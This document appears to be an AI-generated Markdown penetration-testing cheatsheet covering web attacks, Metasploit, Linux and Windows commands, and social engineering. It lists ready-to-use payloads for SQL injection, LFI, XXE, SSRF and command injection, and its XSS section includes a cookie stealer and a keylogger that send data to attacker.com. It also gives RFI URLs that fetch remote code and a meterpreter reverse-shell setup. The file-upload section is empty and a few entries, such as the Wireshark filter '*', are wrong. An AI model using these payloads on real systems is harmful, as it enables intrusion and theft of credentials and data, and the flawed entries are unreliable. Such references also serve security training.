 here are all the cheatsheets in Markdown format, which is easily editable:

**Penetration Testing Cheatsheets**
=====================================

### Table of Contents

* [SQL Injection](#sql-injection)
* [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
* [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
* [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
* [Command Injection](#command-injection)
* [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
* [XML External Entity (XXE)](#xml-external-entity-xxe)
* [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
* [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
* [File Upload Vulnerabilities](#file-upload-vulnerabilities)
* [Common Linux Commands](#common-linux-commands)
* [Common Windows Commands](#common-windows-commands)
* [Metasploit Commands](#metasploit-commands)
* [Burp Suite Tips and Tricks](#burp-suite-tips-and-tricks)
* [Wireshark Filters](#wireshark-filters)
* [Common Web Application Security Misconfigurations](#common-web-application-security-misconfigurations)
* [Common Cryptographic Attacks](#common-cryptographic-attacks)
* [Common Network Protocols and Their Vulnerabilities](#common-network-protocols-and-their-vulnerabilities)
* [Social Engineering Techniques](#social-engineering-techniques)
* [Common Vulnerability Scanning Tools](#common-vulnerability-scanning-tools)

### SQL Injection
----------------

#### Basic SQL Injection Payloads

* **Bypass Authentication:** `' OR '1'='1' --`
* **Union-based SQLi:** `' UNION SELECT null, username, password FROM users --`
* **Error-based SQLi:** `' AND 1=CONVERT(int, (SELECT @@version)) --`
* **Blind SQLi (Boolean-based):** `' AND (SELECT SUBSTRING(@@version, 1, 1)) = '5' --`

#### Advanced SQL Injection Payloads

* **Extracting Data:** `' UNION SELECT 1, username, password FROM users --`
* **Time-based Blind SQLi:** `' OR IF(1=1, SLEEP(5), 0) --`

### Cross-Site Scripting (XSS)
---------------------------

#### Reflected XSS Payloads

* **Basic Alert:** `<script>alert('XSS')</script>`
* **Cookie Stealer:** `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`

#### Stored XSS Payloads

* **Persistent Alert:** `<img src=x onerror="alert('XSS')">`
* **Keylogger:** `<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>`

### Remote File Inclusion (RFI)
---------------------------

#### Basic RFI Payloads

* **Include a Remote File:** `http://target.com/vuln.php?page=http://attacker.com/malicious.txt`
* **Execute PHP Code:** `http://target.com/vuln.php?page=http://attacker.com/malicious.php`

### Local File Inclusion (LFI)
---------------------------

#### Basic LFI Payloads

* **Access `/etc/passwd`:** `page=../../../../etc/passwd`
* **Null Byte Injection (to bypass extensions):** `page=../../../../etc/passwd%00`

### Command Injection
-----------------

#### Basic Command Injection Payloads

* **Execute Command:** `; ls -la`
* **Chaining Commands:** `| whoami`

### Cross-Site Request Forgery (CSRF)
-----------------------------

#### Basic CSRF Payloads

* **Form Submission:** `<form action="http://target.com/vulnerable_action" method="POST"> <input type="hidden" name="param" value="malicious_value"> <input type="submit" value="Submit"> </form>`

### XML External Entity (XXE)
-------------------------

#### Basic XXE Payloads

* **Extracting Files:** `<?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <data>&xxe;</data>`

### Server-Side Request Forgery (SSRF)
------------------------------

#### Basic SSRF Payloads

* **Access Internal Services:** `http://target.com/vulnerable_endpoint?url=http://169.254.169.254/latest/meta-data/`

### Insecure Direct Object Reference (IDOR)
----------------------------------

#### Basic IDOR Payloads

* **Accessing User Data:** `http://target.com/user?id=1234`

### File Upload Vulnerabilities### Common Linux Commands
-------------------------

#### Network Scanning

* **Nmap:** `nmap -sS -sV -A -p- target_ip`
* **Netstat:** `netstat -tuln`

#### File Permissions

* **List Files:** `ls -l`
* **Change Permissions:** `chmod 755 file`

#### User Management

* **List Users:** `cat /etc/passwd`
* **Create User:** `useradd username`

#### Process Management

* **List Processes:** `ps aux`
* **Kill Process:** `kill pid`

### Common Windows Commands
-------------------------

#### Network Configuration

* **IPConfig:** `ipconfig /all`
* **Netstat:** `netstat -an`

#### Active Users

* **List Users:** `net user`
* **Create User:** `net user username password /add`

#### Service Management

* **List Services:** `sc query`
* **Start Service:** `net start service`

#### Process List

* **List Processes:** `tasklist`
* **Kill Process:** `taskkill /pid pid`

### Metasploit Commands
---------------------

#### Starting Metasploit

* **Start Metasploit:** `msfconsole`

#### Search for Exploits

* **Search Exploits:** `search type:exploit name:target`

#### Use an Exploit

* **Use Exploit:** `use exploit/multi/handler`

#### Set Payload

* **Set Payload:** `set payload windows/meterpreter/reverse_tcp`

#### Run the Exploit

* **Run Exploit:** `exploit`

### Burp Suite Tips and Tricks
-----------------------------

#### Intercepting Requests

* **Enable Proxy:** `Proxy > Options > Intercept`
* **Set Browser Proxy:** `Browser > Settings > Proxy`

#### Repeater

* **Send to Repeater:** `Right-click > Send to Repeater`

#### Intruder

* **Use Intruder:** `Intruder > Positions > Add`
* **Configure Intruder:** `Intruder > Options > Configure`

#### Scanner

* **Use Scanner:** `Scanner > New Scan`
* **Configure Scanner:** `Scanner > Options > Configure`

#### Extensions

* **Install Extensions:** `Extender > BApp Store`

### Wireshark Filters
-------------------

#### Display All Traffic

* **All Traffic:** `*`

#### HTTP Traffic

* **HTTP Traffic:** `http`

#### TCP Traffic

* **TCP Traffic:** `tcp`

#### Filter by IP

* **Filter by IP:** `ip.addr == 192.168.1.1`

#### Filter by Port

* **Filter by Port:** `tcp.port == 80`

### Common Web Application Security Misconfigurations
---------------------------------------------------

#### Directory Listing Enabled

* **Check for Directory Listing:** `/` or `/admin/`

#### Sensitive Files Accessible

* **Check for Sensitive Files:** `/config.php` or `/backup.zip`

#### Default Credentials

* **Check for Default Credentials:** `admin/admin`

#### Unrestricted File Upload

* **Check for Unrestricted File Upload:** `upload.php`

### Common Cryptographic Attacks
------------------------------

#### Brute Force

* **Use Brute Force:** `John the Ripper` or `Hashcat`

#### Rainbow Tables

* **Use Rainbow Tables:** `Pre-computed hashes`

#### Padding Oracle Attack

* **Use Padding Oracle Attack:** `Exploit padding errors`

#### Man-in-the-Middle (MitM)

* **Use MitM:** `Capture and decrypt traffic`

### Common Network Protocols and Their Vulnerabilities
---------------------------------------------------

#### HTTP

* **Vulnerabilities:** `SQLi`, `XSS`, `CSRF`

#### FTP

* **Vulnerabilities:** `Anonymous login`, `clear-text credentials`

#### SMTP

* **Vulnerabilities:** `Email spoofing`, `open relays`

#### DNS

* **Vulnerabilities:** `DNS spoofing`, `cache poisoning`

### Social Engineering Techniques
------------------------------

#### Phishing

* **Use Phishing:** `Crafting emails that appear legitimate`

#### Pretexting

* **Use Pretexting:** `Creating a fabricated scenario`

#### Baiting

* **Use Baiting:** `Leaving infected USB drives`

#### Tailgating

* **Use Tailgating:** `Following someone into a secure area`

### Common Vulnerability Scanning Tools
--------------------------------------

#### Nessus

* **Use Nessus:** `Comprehensive vulnerability scanning`

#### OpenVAS

* **Use OpenVAS:** `Open-source vulnerability scanner`

#### Nikto

* **Use Nikto:** `Web server scanner for vulnerabilities`

#### Burp Suite

* **Use Burp Suite:** `Web application security testing tool`